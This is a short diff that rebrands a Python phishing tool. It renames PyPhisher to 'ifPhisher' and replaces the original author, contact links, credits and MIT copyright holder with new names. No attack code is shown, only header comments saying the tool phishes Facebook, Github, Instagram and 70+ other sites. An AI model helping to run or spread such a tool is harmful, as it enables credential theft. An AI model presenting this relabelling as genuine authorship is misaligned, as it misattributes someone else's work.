@@ -1,24 +1,24 @@
 # -*- coding: UTF-8 -*-
-# ToolName   : PyPhisher
-# Author     : KasRoudra
-# Version    : 2.0
+# ToolName   : ifPhisher
+# Author     : ifshamim
+# Version    : 5.0
 # License    : MIT
-# Copyright  : KasRoudra (2021-2022)
-# Github     : https://github.com/KasRoudra
-# Contact    : https://m.me/KasRoudra
-# Description: PyPhisher is a phishing tool in python
+# Copyright  : ifshamim (2021-2022)
+# Github     : https://github.com/rjshamim
+# Contact    : https://m.me/iehf4343
+# Description: ifPhisher is a phishing tool in python
 # Tags       : Facebook Phishing, Github Phishing, Instagram Phishing and 70+ other sites available
 # 1st Commit : 08/08/2021
 # Language   : Python
 # Portable file/script
 # If you copy open source code, consider giving credit
-# Credits    : Zphisher, MaskPhish, AdvPhishing
+# Credits    : BD dark army
 # Env        : #!/usr/bin/env python
 
 """
 MIT License
 
-Copyright (c) 2022 KasRoudra
+Copyright (c) 2022 ifshamim
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
@@ -1366,4 +1366,4 @@ if __name__ == '__main__':
     except Exception as e:
         exception_handler(e)
             
-# If this code helped you, consider staring repository. Your stars encourage me a lot!
+# If this code helped you, consider staring repository. Your stars encourage me a lot from IEHF!
